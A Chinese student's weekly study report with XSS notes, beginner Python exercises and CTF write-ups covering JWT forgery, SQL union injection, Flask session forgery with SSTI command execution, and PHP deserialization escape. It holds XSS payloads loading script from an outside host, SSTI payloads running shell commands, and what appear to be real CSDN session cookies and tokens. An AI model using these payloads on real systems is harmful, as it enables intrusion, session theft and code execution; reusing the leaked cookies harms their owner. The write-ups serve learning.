# <font style="color:rgb(38, 38, 38);">完成事项</font>


# <font style="color:rgb(38, 38, 38);">如何解决未完成事项</font>


# <font style="color:rgb(38, 38, 38);">下周待做事项</font>


# <font style="color:rgb(38, 38, 38);">本周学习的知识分享</font>
## XSS
### Cookie和session
| Cookie | session |
| ---- | ---- |
| 保存在客户端 | 保存在服务端 |
| 通常多条 | 通常一条 |
| uuid_tt_dd=10_19044849850-1724147225647-379006; fid=20_77281301535-1724147226111-746795; UserName=Geohot_S; UserInfo=bb28f699472f44acaa8ed774eefa330e; UserToken=bb28f699472f44acaa8ed774eefa330e; UserNick=Geohot_S; AU=FB7; UN=Geohot_S; BT=1724147309946; p_uid=U010000; tfstk=fPg-GsNGLKvl__xnPbt0-vef7YAmJ4hzkYl1-J2lAxHxTvQlry4uAWwxLa0ntXidJfyVrb0ot9aKTzZEqJ2upyhEBIvMSFcrayrBIdYMLR02CPPQNk63cjNl_RLBoFcrasic5hODSMFZBxvLdvZ7c-Nzhg_SdWaXMWNhFM_SdjOYT-NCduNBltN317GE9QeVN7QKAJqGm2J2JwQKkSwU6bLdJS0zwoesNMbCRhN82RG7HdD3UjrjTk3FTwEoNckU1Y6WeyGY6AFteHfUemGirqrOOIUozbi_AV9FAAU-plg7D6_K1ze8kSg6tGymk8DIyoOGWk4jSlaSmnJuxzFtd4kR9wMsif0z02pOhJou_rN-dF9A4AuiW1aVIRFh2IdAYMr7iGtdotAopH4QMRA7VMSUxSPYIIdcYMr7GSeMNMjFYkQO.; csdn_newcert_Geohot_S=1; c_adb=1; c_dl_prid=1728996086729_848872; c_dl_rid=1729171268300_118553; c_dl_fref=https://blog.csdn.net/qq_46145027/article/details/130293395; c_dl_fpage=/download/qq_46145027/87716310; c_dl_um=-; https_waf_cookie=6f823236-f96f-41bd46f9d6446c1931cae9f250edd40ed52c; dc_session_id=10_1729422177714.544749; c_first_ref=cn.bing.com; c_segment=14; dc_sid=3534a99340fc8caa9791aaf5a9e1d149; c_first_page=https%3A//blog.csdn.net/weixin_49125123/article/details/131545561; c_dsid=11_1729422399529.533186; log_Id_click=860; waf_captcha_marker=711c3a3f31dc80add4b8ca1f0532c31205983d46701d3f68a31b62fd0765ec22; c_pref=https%3A//cn.bing.com/; c_ref=https%3A//blog.csdn.net/weixin_49125123/article/details/131545561; c_utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7Ebaidujs_baidulandingword%7Edefault-9-136262690-blog-131545561.235%5Ev43%5Epc_blog_bottom_relevance_base7; c_utm_relevant_index=12; c_page_id=default; log_Id_pv=785; creativeSetApiNew=%7B%22toolbarImg%22%3A%22https%3A//img-home.csdnimg.cn/images/20231011044944.png%22%2C%22publishSuccessImg%22%3A%22https%3A//img-home.csdnimg.cn/images/20240229024608.png%22%2C%22articleNum%22%3A0%2C%22type%22%3A0%2C%22oldUser%22%3Afalse%2C%22useSeven%22%3Atrue%2C%22oldFullVersion%22%3Afalse%2C%22userName%22%3A%22Geohot_S%22%7D; log_Id_view=28295; dc_tos=slnjd0 | PHPSession=13373896334435498 |


```javascript
document.cookie;
document.cookie="username=Shone"
alert()
setcookie()
<sCRiPt sRC=//xs.pe/5K3></sCrIpT>
```

![](https://gitee.com/SSSSSHONE/ss/raw/master/20241020190113.png)
DOM反射: 
';</script></textarea>'"><script src=http://xs.pe/5K3></script>
DOM跳转: 
?jumpto=javascript:$.getScript("//xx.xx//xx")


## python
- 打印菱形
```python
line = int(input("我会生成一个菱形,请输入菱形的行数；"))
while line%2 == 0:
    line = int(input("必须是奇数,请重新输入；"))
mid = line//2+1
for i in range(1,line+1):
    if i<=mid:
        print(' '*(mid-i),'* '*i)
    elif i>mid:
        print(' '*(i-mid),'* '*(line-i+1))      
```
- 九九乘法表
```python
for i in range(1,10):
    for j in range(1,10):
        if j<=i:
            print(str(j)+'*'+str(i),'=',i*j,end=' ')
            j+=1
    print(' ')
```
- 猜数字
```python
import random
num = random.randint(1,100)
count = 1
guess = int(input("猜猜我的数字是多少:"))
while num != guess:
    if guess > num:
        print("大了")
    elif guess <num:
        print("小了")
    count +=1
    guess = int(input("再试试吧:"))
else:
    print("猜对啦!")
    print("你一共猜了",count,"次!",sep="")
```


## 山河CTF
### [Week1] jvav
```java
import java.io.File;
import java.io.FileNotFoundException;
import java.util.Scanner;

public class demo{
    public static void main(String[] args) {
        // 定义 flag 文件路径
        String filePath = "/flag";

        try {
            // 创建文件对象
            File flagFile = new File(filePath);

            // 检查文件是否存在
            if (flagFile.exists() && flagFile.isFile()) {
                // 使用 Scanner 读取文件内容
                Scanner scanner = new Scanner(flagFile);
                System.out.println("Flag file content:");

                // 逐行读取文件内容并打印到控制台
                while (scanner.hasNextLine()) {
                    String line = scanner.nextLine();
                    System.out.println(line);
                }
                scanner.close();
            } else {
                System.out.println("Flag file not found!");
            }
        } catch (FileNotFoundException e) {
            // 如果文件未找到，捕获并处理异常
            System.out.println("An error occurred while reading the flag file.");
            e.printStackTrace();
        }
    }
}
```
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241022135617.png)  
### [Week2]guess_the_number
python的`random`生成的随机数是伪随机,确定种子就能破解  
自己写了一段python脚本,用来爆破出种子  
```python
import random
first_num = int(input("请输入第一个数字:"))
for seed in range(1000000,9999999):
    random.seed(seed)
    if first_num == random.randint(1000000000,9999999999):
        print("下一个数字是:",random.randint(1000000000,9999999999))
```  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241021184725.png)
### [Week2]登录验证
本题首先是一个弱口令,bp爆破得到密码是`admin`  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241021185300.png)
接下来根据提示要伪造`jwt`  
爆破得到密钥为`222333`,修改`role`的值为`admin`  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241021185521.png)  
重新加密jwt后传入得到flag  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241021185746.png)
- 总结
本题考点是`jwt`  
我们需要伪造`jwt`，前提是有密钥  
### [Week2]自助查询
查询库名:`1") union select 1,database()`  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241021190318.png)  
查询表名:`1") union select 1,group_concat(table_name) from information_schema.tables where table_schema='ctf'`  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241021190813.png)  
查询字段名:`1") union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'`
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241021190736.png)  
查询字段内容:`1") union select 1,group_concat(id,scretdata) from flag`  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241021191015.png)
查看注释`-1") union select 1,column_comment from information_schema.columns`  得到flag
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241021191746.png)  
### [Week2]入侵者禁入
首页路由 (/)：

访问首页时，代码设置了一个session，内容为一个包含两个键值对的字典：
is_admin: 0
flag: 'your_flag_here'
然后它读取当前文件的代码并返回。这段代码基本上暴露了整个应用的源代码，虽然这可能在开发时有帮助，但在生产环境中这样做是不安全的。
/admin 路由：

这个路由检查用户的session来决定用户是否是管理员，并根据情况显示不同的内容。
它首先尝试从session中获取role值，并检查它是否是一个字典类型。如果不是字典，会抛出异常并返回错误消息。
然后，它检查role中的is_admin值。如果is_admin为1，显示flag，否则返回错误信息。

`python3 flask_session_cookie_manager3.py decode -c eyJyb2xlIjp7ImZsYWciOiJ5b3VyX2ZsYWdfaGVyZSIsImlzX2FkbWluIjowfX0.ZxY55Q.a3xS5bSAUnBYzLQjcCHlPMHdoNE`
>b'{"role":{"flag":"your_flag_here","is_admin":0}}'  
`python3 flask_session_cookie_manager3.py encode -s "0day_joker" -t '{"role":{"flag":"{{9*9}}","is_admin":1}}'`
>eyJyb2xlIjp7ImZsYWciOiJ7ezkqOX19IiwiaXNfYWRtaW4iOjF9fQ.ZxZLuw.rgtv-Z7PbuKRWuxmz4Y4QO2qA98  
![](https://gitee.com/SSSSSHONE/ss/raw/master/20241021201546.png)  
页面回显`81`,证明存在`SSTI漏洞`  


().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")

python3 flask_session_cookie_manager3.py encode -s "0day_joker" -t '{"role":{"flag":"{{().__class__.__bases__[0].__subclasses__()[64].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")
}}","is_admin":1}}'





python3 flask_session_cookie_manager3.py decode -c "eyJyb2xlIjp7ImZsYWciOiJ7e2xpcHN1bS5nbG9iYWxzW1wib3NcIl0ucG9wZW4oXCJscyAvXCIpLnJlYWQoKX19IiwiaXNfYWRtaW4iOjF9fQ.Zxc6hA.3AsYD8rzn6WkDvE7oB4vFaJTl68" -s "0day_joker"

python3 flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("ls").read()}}', 'is_admin': 1}}"

python3 flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("ls /").read()}}', 'is_admin': 1}}"

python3 flask_session_cookie_manager3.py encode -s "0day_joker" -t "{'role': {'flag': '{{lipsum.globals["os"].popen("cat /flag").read()}}', 'is_admin': 1}}"

## SSTI漏洞
没学明白
## cms rce
没学明白
## buuoj
### [安洵杯 2019]easy_serialize_php
1. phpinfo()
    ```php
    $function = @$_GET['f'];

    if($function == 'highlight_file'){
        highlight_file('index.php');
    }else if($function == 'phpinfo'){
        eval('phpinfo();'); //maybe you can find something in here!
    }else if($function == 'show_image'){
        $userinfo = unserialize($serialize_info);
        echo file_get_contents(base64_decode($userinfo  ['img']));
    }
    ```
    有提示,所以传入`f=phpinfo`  
    跳转到`phpinfo()`界面,附文章:[phpinfo中的有用信息](https://www.cnblogs.com/Cl0ud/p/15999347.html)  
    发现疑似为flag的文件
    ![](https://gitee.com/SSSSSHONE/ss/raw/master/20241022174542.png)  
2. extract()变量覆盖
    这段代码初始化了`$_SESSION`的值  
    ```php
    if($_SESSION){
        unset($_SESSION);
    }

    $_SESSION["user"] = 'guest';
    $_SESSION['function'] = $function;

    extract($_POST);
    ```
    使用POST传参,可覆盖`$_SESSION`内容  
    格式:  
    `_SESSION[变量名]=值`  


3. php反序列化字符逃逸 
    本来只需要GET传入`img_path`即可,但是代码编码时使用了`sha1()`,导致后面读取时解码不出来,要另找办法  
    ```php
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));

    echo file_get_contents(base64_decode($userinfo['img']));
    ```  
    代码审计,没审出来,参考(文章)[https://www.cnblogs.com/LLeaves/p/12813992.html]得知可使用**php反序列化字符逃逸**来覆盖`img`的值  
    ```php  
    <?php
    function filter($img){
        $filter_arr = array('php','flag','php5','php4','fl1g');
        $filter = '/'.implode('|',$filter_arr).'/i';
        return preg_replace($filter,'',$img);
    }

    $serialize_info = filter(serialize($_SESSION));

    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
    ``` 
    实现逃逸需要利用`filter`函数,此函数会把特定内容替换为空 
    例如:   
    ```php
    $_SESSION["phpphpphp"]='a";s:2:"aa";s:3:"img";s:5:"11111";}';
    ```  
    序列化结果是: `a:1:{s:9:"phpphpphp";s:35:"a";s:2:"aa";s:3:"img";s:5:"11111";}";}`  
    经过filter`函数处理后:  ```a:1:{s:9:"";s:35:"a";s:2:"aa";s:3:"img";s:5:"11111";}";}```   
    ![](https://gitee.com/SSSSSHONE/ss/raw/master/91538.jpg)
    - 因为`php`被替换为空,`";s:35:"a`成为了变量名,`s:2:"aa";`为值  
    - 后面的`s:3:"img";s:5:"11111";`也是一组完整的值  
    - 最后的`";}`则被忽略  
4. 构建payload  
    根据此原理我们可以把`phpphpphp`中`img`的值改为我们想要的  
    `d0g3_f1ag.php`base64编码后为`ZDBnM19mMWFnLnBocA==`  
    payload:  `_SESSION["phpphpphp"]=a";s:2:"aa";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}`  
    ![](https://gitee.com/SSSSSHONE/ss/raw/master/20241022203539.png)  
    得知文件名为`/d0g3_fllllllag`再改`img`值为`L2QwZzNfZmxsbGxsbGFn`
    payload:  `_SESSION["phpphpphp"]=a";s:2:"aa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}`  
    得到flag:  
    ![](https://gitee.com/SSSSSHONE/ss/raw/master/20241022203729.png)
# <font style="color:rgb(38, 38, 38);">本周自己学习过程中遇到的问题和疑问点</font>


SELECT table_name, table_comment FROM information_schema.TABLES  WHERE table_schema='ctf' 
# <font style="color:rgb(38, 38, 38);">情感、思考、观点</font>


